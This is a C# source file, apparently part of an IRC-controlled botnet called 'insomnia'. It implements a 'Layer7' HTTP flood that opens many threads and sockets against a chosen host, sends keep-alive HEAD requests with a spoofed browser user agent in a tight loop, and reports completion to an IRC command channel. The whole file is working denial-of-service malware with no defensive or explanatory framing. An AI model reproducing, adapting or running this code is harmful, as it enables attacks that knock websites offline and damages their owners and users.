using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Diagnostics;

namespace insomnia
{
    class Layer7
    {
        public static string host;
        public static int port;
        public static int delay;
        public static int threads = 25;
        public static int sockets = 5;

        private static IPEndPoint _ip;
        private static ThreadStart[] _ts;
        private static Thread[] _t;

        public static bool isEnabled = false;


        public static void Start()
        {
            Thread l7 = new Thread(Begin);
            l7.IsBackground = true;
            l7.Start();
        }

        private static void Begin()
        {
            try
            {
                _ip = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
            }
            catch
            {
                _ip = new IPEndPoint(IPAddress.Parse(host), port);
            }

            _t = new Thread[threads];
            _ts = new ThreadStart[threads];

            for (int i = 0; i < threads; i++)
            {
                _ts[i] = new ThreadStart(SendPayload);
                _t[i] = new Thread(_ts[i]);
                _t[i].Start();
            }

            Thread.Sleep(delay * 1000);
            if (isEnabled)
            {
                Stop();
                IRC.WriteMessage("Layer7 flood on" + IRC.ColorCode(" " + host) + " for" + IRC.ColorCode(" " + delay) + " seconds has finished.", Config._mainChannel());
            }
        }

        public static void Stop()
        {
            isEnabled = false;
        }

        private static void SendPayload()
        {
            try
            {
                string request = "HEAD / HTTP/1.1\r\nHost: {0}\r\nUser-Agent: {1}\r\nConnection: Keep-Alive\r\n\r\n";
                string build_request = string.Format(request, host, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1");
                byte[] data = Encoding.UTF8.GetBytes(build_request);

                // Build socket array
                Socket[] _s = new Socket[sockets];
                for (int i = 0; i < sockets; i++)
                    _s[i] = new Socket(_ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                // As long as flood is enabled lets send data on each socket
                while (isEnabled)
                {

                    foreach (Socket s in _s)
                    {
                        if (!s.Connected)
                            try { s.Connect(_ip.Address, port); }
                            catch { }
                        else
                            try { s.Send(data, data.Length, 0); }
                            catch { }
                    }
                    Thread.Sleep(1); // life in the fast lane, sure to make you lose your mind
                }

                foreach (Socket s in _s)
                {
                    s.Shutdown(SocketShutdown.Both);
                    s.Close();
                }
            }
            catch
            {
            }
        }
    }
}
